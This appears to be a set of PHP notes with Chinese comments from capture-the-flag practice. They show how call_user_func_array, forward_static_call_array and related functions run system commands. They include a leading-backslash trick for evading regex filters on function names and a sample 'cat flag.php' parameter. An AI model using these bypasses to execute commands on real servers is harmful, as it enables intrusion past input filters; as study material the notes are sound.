<?php
$f='system或\system';
// 函数名或\函数名
// 在函数名前加上\代表全局命名空间,内置函数都在这个空间内用于绕过检测函数名的正则

$f=['对象名','方法名'];
// 对象方法

$f=function($x){echo $x;};
// 闭包函数

// b[]=cat flag.php
$a='GET_["b"]';
//将前端参数改为数组类型，后端接收类型也会是数组
$a=['参数'];
//参数(必须是数组形式)

forward_static_call_array($f,$a);
call_user_func_array($f,$a);
// 将f当成函数或对象方法,a当成函数参数执行
?>

<?php
call_user_func('system', 'whoami');
forward_static_call('system', 'whoami')
// 和上述功能类似,但第二参数不需要是数组
?>